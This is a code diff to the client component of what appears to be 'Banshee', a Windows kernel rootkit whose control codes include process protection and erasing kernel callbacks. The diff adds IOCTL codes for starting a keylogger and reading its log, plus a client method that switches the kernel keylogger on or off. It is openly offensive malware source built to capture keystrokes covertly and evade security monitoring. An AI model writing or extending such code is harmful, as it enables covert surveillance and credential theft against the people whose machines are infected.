@@ -32,6 +32,9 @@ typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
 #define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define BE_IOCTL_ERASE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+#define BE_IOCTL_START_KEYLOGGER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define BE_IOCTL_GET_KEYLOG CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
 enum CALLBACK_TYPE {
     CreateProcessNotifyRoutine = 0,
     CreateThreadNotifyRoutine = 1
@@ -423,6 +426,34 @@ public:
         {
             return BE_ERR_IOCTL;
         }
+        return BE_SUCCESS;
+    }
+
+    /**
+    * Dispatches IOCTL to start or stop the keylogger.
+    *
+    * @param start TRUE to start, FALSE to stop
+    * @param status of the keylogger (TRUE if running, FALSE if stopped)
+    * @return BANSHEE_STATUS status code.
+    */
+    BANSHEE_STATUS
+    IoCtlStartKeylogger(const BOOLEAN& start) const
+    {
+        DWORD dwBytesReturned = 0;
+
+        BOOL success = DeviceIoControl(
+            this->hDevice,
+            BE_IOCTL_START_KEYLOGGER,
+            (LPVOID)&start, sizeof(BOOLEAN),
+            NULL, 0,
+            &dwBytesReturned, NULL
+        );
+
+        if (!success)
+        {
+            return BE_ERR_IOCTL;
+        }
+
         return BE_SUCCESS;
     }
 
